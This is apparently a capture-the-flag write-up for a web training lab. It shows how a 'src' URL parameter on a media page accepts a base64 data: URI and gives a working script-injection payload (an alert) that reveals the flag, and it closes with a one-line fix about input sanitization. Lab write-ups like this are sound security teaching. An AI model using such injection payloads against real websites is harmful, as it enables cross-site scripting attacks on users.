The vulnerability is on the media page, you can access it by clicking on the 3th image in the home page
In the url, http://192.168.1.64/?page=media&src=nsa, the image to display is searched by the fild in the url "src".
So what if we try to execute something, like <script>alert("hacked")</script>, by sending it in base64 ?

you'll have to execute the url: http://192.168.1.64/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgiaGFja2VkIik8L3NjcmlwdD4=
PHNjcmlwdD5hbGVydCgiaGFja2VkIik8L3NjcmlwdD4= is the base64 for <script>alert("hacked")</script>

now, you'll get the flag displayed with an image.

how to correct: - validate the input entered by users and sanitize it
